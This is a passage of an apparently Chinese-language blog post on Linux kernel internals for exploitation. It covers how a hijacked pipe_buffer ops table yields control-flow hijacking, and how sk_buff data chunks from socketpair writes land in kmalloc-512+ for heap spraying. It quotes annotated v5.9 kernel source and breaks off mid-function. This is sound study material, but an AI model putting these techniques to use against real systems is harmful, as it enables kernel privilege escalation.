<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (!buf-&gt;len) &#123;</span><br><span class="line">        pipe_buf_release(pipe, buf);</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>从而调用<code>pipe_buf_release</code>将<code>buf-&gt;ops</code>清空。</p>
<p>🔺注：（其实这里既然调用到了<code>pipe_buf_release</code>函数，那么我们直接通过<code>read</code>将管道<code>pipe</code>中的所有数据读取出来，其实也能执行该<code>release</code>函数指针的，从而劫持程序控制流的。）</p>
<p>那么接着上述的情况，那么在关闭两端时<code>buf-&gt;ops</code>这个函数表就会存在</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png" alt="image-20220509192251738"></p>
<p>而当<code>buf-&gt;ops</code>这个函数表存在时，关闭管道符两端进入上述判断之后，就会调用到其中的<code>pipe_buf_release</code>函数，该函数会调用到这个<code>buf-&gt;ops</code>函数表结构下对应的<code>relase</code>函数指针，该指针在上述的<code>pipe_buf_operations</code>结构中有提到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png" alt="image-20220509193945468"></p>
<p>那么如果劫持了<code>buf-&gt;ops</code>这个函数表，就能控制到<code>release</code>函数指针，从而劫持控制流程。</p>
<p>不过<code>pipe</code>管道具体的保存的数据放在哪里，还是不太清楚，听<code>bsauce</code>说是在<code>struct pipe_buffer</code>结构下<code>buf</code>的<code>page</code>里面，但是没有找到，后续还需要继续看看，先mark一下。这样也可以看出来，每写入一条信息时，内核的<code>kmalloc</code>对应的堆内存基本是不发生变化的，与下面提到的<code>sk_buff</code>有点不同。</p>

        <h2 id="8-sk-buff—kmalloc-512及以上"   >
          <a href="#8-sk-buff—kmalloc-512及以上" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-sk-buff—kmalloc-512及以上" class="headerlink" title="8.sk_buff—kmalloc-512及以上"></a>8.sk_buff—kmalloc-512及以上</h2>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40039738/article/details/81095013" >(31条消息) socketpair的用法和理解_雪过无痕_的博客-CSDN博客_socketpair</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>和该结构体相关的是一个<code>socketpair</code>系统调用这个也算是<code>socket</code>网络协议的一种，但是是在本地进程之间通信的，而非在网络之间的通信。说到底，这个其实和<code>pipe</code>非常像，也是一个进程间的通信手段。不过相关区分如下：</p>
<ul>
<li>数据传输模式<ul>
<li><code>pipe</code>：单工，发送端<code>fd[1]</code>发送数据，接收端<code>fd[0]</code>接收数据</li>
<li><code>socketpair</code>：全双工，同一时刻两端均可发送和接收数据，无论信道中的数据是否被接收完毕。</li>
</ul>
</li>
<li>模式<ul>
<li><code>pipe</code>：由<code>flag</code>来定义不同模式</li>
<li><code>socketpair</code>：默认阻塞状态</li>
</ul>
</li>
</ul>
<p>此外在《Linux系统编程手册》一书中提到，<code>pipe()</code>函数实际上被实现成了一个对<code>socketpair</code>的调用。</p>

        <h3 id="1-使用方法-1"   >
          <a href="#1-使用方法-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-使用方法-1" class="headerlink" title="(1)使用方法"></a>(1)使用方法</h3>
      
        <h4 id="①创建-1"   >
          <a href="#①创建-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建-1" class="headerlink" title="①创建"></a>①创建</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//默认必须</span></span><br><span class="line"><span class="keyword">int</span> socket_fd[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//domain参数必须被指定为AF_UNIX,不同的</span></span><br><span class="line"><span class="keyword">int</span> sockPair_return = socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socket_fd);</span><br><span class="line"><span class="keyword">if</span>( sockPair_return &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    perror( <span class="string">&quot;socketpair()&quot;</span> );</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后和<code>pipe</code>管道一样，使用<code>write/read</code>即可，不过这个的fd两端都可以写入读取，但是消息传递的时候一端写入消息，就需要从另一端才能把消息读取出来</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(socket_fd[<span class="number">0</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(socket_fd[<span class="number">1</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>


        <h4 id="②释放-2"   >
          <a href="#②释放-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-2" class="headerlink" title="②释放"></a>②释放</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(socket_fd[<span class="number">0</span>]);</span><br><span class="line">close(socket_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>可以看到和<code>pipe</code>是很相似的。</p>

        <h3 id="2-内存分配与释放-1"   >
          <a href="#2-内存分配与释放-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-内存分配与释放-1" class="headerlink" title="(2)内存分配与释放"></a>(2)内存分配与释放</h3>
      <p>在调用<code>socketpair</code>这个系统调用号时，并不会进行相关的内存分配，只有在使用<code>write</code>来写入消息，进行数据传输时才会分配。</p>

        <h4 id="①分配-1"   >
          <a href="#①分配-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①分配-1" class="headerlink" title="①分配"></a>①分配</h4>
      <p>在调用<code>write</code>进行数据写入时</p>
<p>函数链：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write -&gt; ksys_write() -&gt; vfs_write() -&gt; new_sync_write() -&gt; call_write_iter() -&gt; sock_write_iter() -&gt; sock_sendmsg() -&gt; sock_sendmsg_nosec() -&gt; unix_stream_sendmsg()-&gt;内存申请/数据复制</span><br></pre></td></tr></table></div></figure>

<p>在<code>unix_stream_sendmsg</code>开始分叉</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">			       <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">other</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> err, size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	<span class="keyword">int</span> sent = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scm_cookie</span> <span class="title">scm</span>;</span></span><br><span class="line">	<span class="keyword">bool</span> fds_sent = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> data_len;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">	<span class="keyword">while</span> (sent &lt; len) &#123;</span><br><span class="line">		size = len - sent;</span><br><span class="line">		<span class="comment">/* Keep two messages in the pipe so it schedules better */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, (sk-&gt;sk_sndbuf &gt;&gt; <span class="number">1</span>) - <span class="number">64</span>);</span><br><span class="line">		<span class="comment">/* allow fallback to order-0 allocations */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, SKB_MAX_HEAD(<span class="number">0</span>) + UNIX_SKB_FRAGS_SZ);</span><br><span class="line">		data_len = <span class="keyword">max_t</span>(<span class="keyword">int</span>, <span class="number">0</span>, size - SKB_MAX_HEAD(<span class="number">0</span>));</span><br><span class="line">		data_len = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_ALIGN(data_len));</span><br><span class="line">        <span class="comment">//------------------分叉一:内存申请部分</span></span><br><span class="line">		skb = sock_alloc_send_pskb(sk, size - data_len, data_len,</span><br><span class="line">					   msg-&gt;msg_flags &amp; MSG_DONTWAIT, &amp;err,</span><br><span class="line">					   get_order(UNIX_SKB_FRAGS_SZ));</span><br><span class="line">        <span class="comment">//相关检查部分</span></span><br><span class="line">		<span class="keyword">if</span> (!skb)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		<span class="comment">/* Only send the fds in the first buffer */</span></span><br><span class="line">		err = unix_scm_to_skb(&amp;scm, skb, !fds_sent);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//.....</span></span><br><span class="line">        <span class="comment">//----------------------分叉二:数据复制部分</span></span><br><span class="line">		skb_put(skb, size - data_len);</span><br><span class="line">		skb-&gt;data_len = data_len;</span><br><span class="line">		skb-&gt;len = size;</span><br><span class="line">        <span class="comment">//这里开始进行数据复制</span></span><br><span class="line">		err = skb_copy_datagram_from_iter(skb, <span class="number">0</span>, &amp;msg-&gt;msg_iter, size);</span><br><span class="line">		<span class="keyword">if</span> (err) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">		sent += size;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sent;</span><br><span class="line">out_err:</span><br><span class="line">	scm_destroy(&amp;scm);</span><br><span class="line">	<span class="keyword">return</span> sent ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-内存申请"   >
          <a href="#A-内存申请" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-内存申请" class="headerlink" title="A.内存申请"></a>A.内存申请</h5>
      <p>先进行相关内存申请，即<code>sock_alloc_send_pskb() -&gt; alloc_skb_with_frags() -&gt; alloc_skb() -&gt; __alloc_skb()</code></p>
<p>还是挺长的，但是最重要的还是最后的<code>__alloc_skb</code>函数，</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>,</span></span><br><span class="line"><span class="class">			    <span class="title">int</span> <span class="title">flags</span>, <span class="title">int</span> <span class="title">node</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> *<span class="title">shinfo</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	u8 *data;</span><br><span class="line">	<span class="keyword">bool</span> pfmemalloc;</span><br><span class="line"></span><br><span class="line">	cache = (flags &amp; SKB_ALLOC_FCLONE)</span><br><span class="line">		? skbuff_fclone_cache : skbuff_head_cache;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks() &amp;&amp; (flags &amp; SKB_ALLOC_RX))</span><br><span class="line">		gfp_mask |= __GFP_MEMALLOC;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Get the HEAD */</span></span><br><span class="line">    <span class="comment">//从专门的缓存池skbuff_fclone_cache/skbuff_head_cache中申请内存</span></span><br><span class="line">    <span class="comment">//作为头部的管理结构</span></span><br><span class="line">	skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~__GFP_DMA, node);</span><br><span class="line">	<span class="keyword">if</span> (!skb)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">    <span class="comment">//先对齐，这个和L1_CACHE_BYTES有关,64位系统即和64(0x40)对齐,32位类似，具体的还是查一下最好</span></span><br><span class="line">	size = SKB_DATA_ALIGN(size);</span><br><span class="line">    <span class="comment">//size += 对齐之后的0x140</span></span><br><span class="line">    <span class="comment">//那么size只可能是0x140+n*0x40,最低为0x180,属于kmalloc-512</span></span><br><span class="line">	size += SKB_DATA_ALIGN(<span class="keyword">sizeof</span>(struct skb_shared_info));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//虽然是kmalloc_reserve函数，但是最终还是kmalloc形式</span></span><br><span class="line">    <span class="comment">//调用到`__kmalloc_node_track_caller`函数进行分配</span></span><br><span class="line">    <span class="comment">//这个data即为我们实际的存储数据的地方,也是从kmalloc申请出的堆块</span></span><br><span class="line">    <span class="comment">//并且是从对开的开头位置处开始存储,完成内存申请后返回unix_stream_sendmsg函数</span></span><br><span class="line">    <span class="comment">//在`skb_copy_datagram_from_iter`函数中数据会被复制</span></span><br><span class="line">	data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);</span><br><span class="line">	<span class="keyword">if</span> (!data)</span><br><span class="line">		<span class="keyword">goto</span> nodata;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	size = SKB_WITH_OVERHEAD(ksize(data));</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="comment">//初始化头部的管理结构</span></span><br><span class="line">	<span class="built_in">memset</span>(skb, <span class="number">0</span>, offsetof(struct sk_buff, tail));</span><br><span class="line">	<span class="comment">/* Account for allocated memory : skb + skb-&gt;head */</span></span><br><span class="line">	skb-&gt;truesize = SKB_TRUESIZE(size);</span><br><span class="line">	skb-&gt;pfmemalloc = pfmemalloc;</span><br><span class="line">	refcount_set(&amp;skb-&gt;users, <span class="number">1</span>);</span><br><span class="line">	skb-&gt;head = data;</span><br><span class="line">	skb-&gt;data = data;</span><br><span class="line">	skb_reset_tail_pointer(skb);</span><br><span class="line">	skb-&gt;end = skb-&gt;tail + size;</span><br><span class="line">	skb-&gt;mac_header = (typeof(skb-&gt;mac_header))~<span class="number">0U</span>;</span><br><span class="line">	skb-&gt;transport_header = (typeof(skb-&gt;transport_header))~<span class="number">0U</span>;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> skb;</span><br><span class="line">nodata:</span><br><span class="line">	kmem_cache_free(cache, skb);</span><br><span class="line">	skb = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h6 id="内存申请总结："   >
          <a href="#内存申请总结：" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存申请总结：" class="headerlink" title="内存申请总结："></a>内存申请总结：</h6>
      <ul>
<li><code>sk_buff</code>为数据的管理结构从专门的缓存池<code>skbuff_fclone_cache/skbuff_head_cache</code>中申请内存，没办法进行控制</li>
<li><code>skb-&gt;data</code>为实际的数据结构<ul>
<li><code>size</code>：<code>0x140+n*0x40</code>(0x40的倍数补齐)。即如果传入的数据长度为0x3f，则n为1，传入数据为0x41，则n为2。</li>
<li>堆块申请：走<code>kmalloc</code>进行申请，比较常见的种类，方便堆喷。</li>
</ul>
</li>
<li>每调用<code>wirte</code>函数写入一次数据，都会走一遍流程，申请新的<code>sk_buff</code>和<code>skb-&gt;data</code>，不同消息之间相互独立。</li>
</ul>

        <h5 id="B-数据复制"   >
          <a href="#B-数据复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-数据复制" class="headerlink" title="B.数据复制"></a>B.数据复制</h5>
      <p>相关内存申请完成之后，回到<code>unix_stream_sendmsg</code>函数，开始进行数据复制<code>skb_copy_datagram_from_iter</code>，即上述提到的。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">skb_copy_datagram_from_iter</span><span class="params">(struct sk_buff *skb, <span class="keyword">int</span> offset,</span></span></span><br><span class="line"><span class="params"><span class="function">                                struct iov_iter *from,</span></span></span><br><span class="line"><span class="params"><span class="function">                                <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = skb_headlen(skb);			<span class="comment">// skb-&gt;len - skb-&gt;data_len;</span></span><br><span class="line">    <span class="keyword">int</span> i, copy = start - offset;			<span class="comment">// copy 是线性数据区的剩余空间大小</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line">    <span class="comment">//拷贝到申请的保存数据的堆块skb-&gt;data</span></span><br><span class="line">    <span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">            copy = len;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_iter(skb-&gt;data + offset, copy, from) != copy)</span><br><span class="line">            <span class="keyword">goto</span> fault;</span><br><span class="line">        <span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        offset += copy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放-3"   >
          <a href="#②释放-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-3" class="headerlink" title="②释放"></a>②释放</h4>
      <p>当从<code>socker</code>套接字中读取出某条信息的所有数据时，就会发生该条信息的相关内存的释放，即该条信息对应<code>sk_buff</code>和<code>skb-&gt;data</code>的释放。同样的，如果该条信息没有被读取完毕，则不会发生该信息相关内存的释放。</p>
<p>在<code>read</code>时进行的函数调用链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read -&gt; ksys_read() -&gt; vfs_read() -&gt; new_sync_read() -&gt; call_read_iter() -&gt; sock_read_iter() -&gt; sock_recvmsg() -&gt; sock_recvmsg_nosec() -&gt; unix_stream_recvmsg() -&gt; unix_stream_read_generic()</span><br></pre></td></tr></table></div></figure>

<p>同样的在<code>unix_stream_read_generic</code>处开始分叉，也是分为两部分，下面截取重要部分</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_read_generic</span><span class="params">(struct unix_stream_read_state *state,</span></span></span><br><span class="line"><span class="params"><span class="function">				    <span class="keyword">bool</span> freezable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">		chunk = <span class="keyword">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>, unix_skb_len(skb) - skip, size);</span><br><span class="line">		skb_get(skb);</span><br><span class="line">        <span class="comment">//------------------分叉一:数据复制</span></span><br><span class="line">        <span class="comment">//recv_actor函数指针是在unix_stream_recvmsg函数中定义的state函数表</span></span><br><span class="line">        <span class="comment">//该函数指针对应unix_stream_read_actor函数,即从这开始进行数据复制</span></span><br><span class="line">		chunk = state-&gt;recv_actor(skb, skip, chunk, state);</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="comment">//传输数据完成之后,skb-&gt;users从2改为1,表示已经复制完数据了,方便后续判断</span></span><br><span class="line">        <span class="comment">//消息中是否还有数据</span></span><br><span class="line">		consume_skb(skb);</span><br><span class="line">		<span class="keyword">if</span> (chunk &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (copied == <span class="number">0</span>)</span><br><span class="line">				copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		copied += chunk;</span><br><span class="line">		size -= chunk;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Mark read part of skb as used */</span></span><br><span class="line">		<span class="keyword">if</span> (!(flags &amp; MSG_PEEK)) &#123;</span><br><span class="line">            <span class="comment">//修改skb类型转换之后对应的consumed字段,其实就是skb-&gt;cb某个位置处的数据</span></span><br><span class="line">            <span class="comment">//#define UNIXCB(skb)	(*(struct unix_skb_parms *)&amp;((skb)-&gt;cb))</span></span><br><span class="line">			UNIXCB(skb).consumed += chunk;</span><br><span class="line">			<span class="comment">//依据上面的consumed和len来判断消息中是否还剩下没有传输的数据</span></span><br><span class="line">            <span class="comment">//有(1)则break,无(0)则进入后续的内存释放阶段</span></span><br><span class="line">			<span class="keyword">if</span> (unix_skb_len(skb))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//------------------------分叉二:内存释放</span></span><br><span class="line">            <span class="comment">//内存释放前置工作</span></span><br><span class="line">			skb_unlink(skb, &amp;sk-&gt;sk_receive_queue);</span><br><span class="line">            <span class="comment">//进入该函数,通过对于skb-&gt;users的判断之后,进入内存释放阶段</span></span><br><span class="line">			consume_skb(skb);</span><br><span class="line">            <span class="comment">//....................</span></span><br><span class="line">	&#125; <span class="keyword">while</span> (size);</span><br><span class="line">        <span class="comment">//......................</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> copied ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-数据复制"   >
          <a href="#A-数据复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-数据复制" class="headerlink" title="A.数据复制"></a>A.数据复制</h5>
      <p>之后的函数调用链为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix_stream_read_actor() -&gt; skb_copy_datagram_msg() -&gt; skb_copy_datagram_iter() -&gt; __skb_datagram_iter()</span><br></pre></td></tr></table></div></figure>

<p>最终进入<code>__skb_datagram_iter</code>，</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __skb_datagram_iter(<span class="keyword">const</span> struct sk_buff *skb, <span class="keyword">int</span> offset,</span><br><span class="line">			       struct iov_iter *to, <span class="keyword">int</span> len, <span class="keyword">bool</span> fault_short,</span><br><span class="line">			       <span class="keyword">size_t</span> (*cb)(<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>, <span class="keyword">void</span> *,</span><br><span class="line">					    struct iov_iter *), <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> start = skb_headlen(skb);</span><br><span class="line">	<span class="keyword">int</span> i, copy = start - offset, start_off = offset, n;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy header. */</span></span><br><span class="line">    <span class="comment">//这个header指的就是数据data,大概就是从这里开始实际的数据</span></span><br><span class="line">	<span class="keyword">if</span> (copy &gt; <span class="number">0</span>) 